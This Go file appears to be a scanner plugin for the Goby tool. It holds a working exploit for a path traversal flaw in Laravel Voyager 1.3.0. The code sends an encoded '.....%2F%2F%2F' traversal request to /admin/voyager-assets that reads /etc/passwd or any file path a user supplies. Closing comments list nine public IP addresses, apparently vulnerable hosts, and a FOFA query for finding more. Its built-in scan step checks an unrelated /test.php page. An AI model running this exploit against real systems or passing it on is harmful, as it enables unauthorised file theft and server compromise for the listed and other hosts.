package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Laravel Framework Voyager Path traversal",
    "Description": "Voyager is a Laravel background management extension package that provides CRUD operations, media management, menu construction, data management and other operations. There is a path traversal vulnerability in Voyager version 1.3.0, which enables arbitrary file reading (no login is required), which can lead to disclosure of sensitive information and even further control of the server.",
    "Product": "Laravel-Framework",
    "Homepage": "https://laravel.com/",
    "DisclosureDate": "2021-06-01",
    "Author": "atdpa4sw0rd@gmail.com",
    "GobyQuery": "(product=\"Laravel-Framework\" || body=\"/admin/voyager-assets\")",
    "Level": "3",
    "Impact": "<p>Voyager is a Laravel background management extension package that provides CRUD operations, media management, menu construction, data management and other operations.</p><p>There is a path traversal vulnerability in Voyager version 1.3.0, where an attacker can traverse any file on the server through directory redirection, and access data, file directories, or some secret files (such as server probe files, webmaster background access addresses, database connection files, server configuration files, system files, etc.) outside of legitimate applications, resulting in data disclosure and even server intrusion.</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed. Please download a patch to fix the vulnerability / upgrade to the latest version: https://github.com/the-control-group/voyager.</p><p>2. Set access policy and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "/etc/passwd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "File Inclusion"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10216"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//httpclient.SetDefaultProxy("http://127.0.0.1:8080")
			cfg_get := httpclient.NewGetRequestConfig("/admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F/etc/passwd")
			cfg_get.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg_get); err == nil {
				return resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, ":/bin"))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			//httpclient.SetDefaultProxy("http://127.0.0.1:8080")
			uri := fmt.Sprintf("/admin/voyager-assets?path=.....%%2F%%2F%%2F.....%%2F%%2F%%2F.....%%2F%%2F%%2F.....%%2F%%2F%%2F.....%%2F%%2F%%2F.....%%2F%%2F%%2F.....%%2F%%2F%%2F.....%%2F%%2F%%2F.....%%2F%%2F%%2F%s", cmd)
			cfg_get := httpclient.NewGetRequestConfig(uri)
			cfg_get.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_get); err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}

// 27.96.130.76
// 54.187.151.139
// 138.201.1.10
// 104.236.51.77
// 206.189.144.193
// 3.232.235.238
// 35.227.170.251
// 103.129.97.207
// 167.99.15.155
//body="/admin/voyager-assets" 这就是fofa语法
